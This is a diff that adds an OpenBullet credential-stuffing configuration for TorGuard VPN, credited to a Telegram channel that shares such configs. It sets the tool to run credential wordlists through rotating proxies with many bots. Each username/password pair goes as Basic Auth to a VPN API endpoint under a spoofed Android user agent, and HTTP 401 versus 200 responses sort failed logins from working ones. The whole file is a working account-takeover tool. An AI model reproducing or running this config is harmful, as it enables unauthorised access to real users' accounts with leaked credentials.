@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "TorGuard [VPN]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2024-12-26T02:59:51.1055271-05:00",
+  "AdditionalInfo": "Telegram Channel: t.me/OpenBullet_CFGs",
+  "RequiredPlugins": [],
+  "Author": "Rc0nM4ster",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET REQUEST GET "https://45.89.173.122:1443/api/v1/setup?public-key=r9lRC5bet%2BH%2BVyqCrmZin%2FAIex4wg5hPk3zl5HimoDk%3D" AutoRedirect=FALSE BasicAuth 
+  USERNAME "<USER>" PASSWORD "<PASS>" 
+  
+  HEADER "Accept-Encoding: " 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I003DD Build/PI)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+
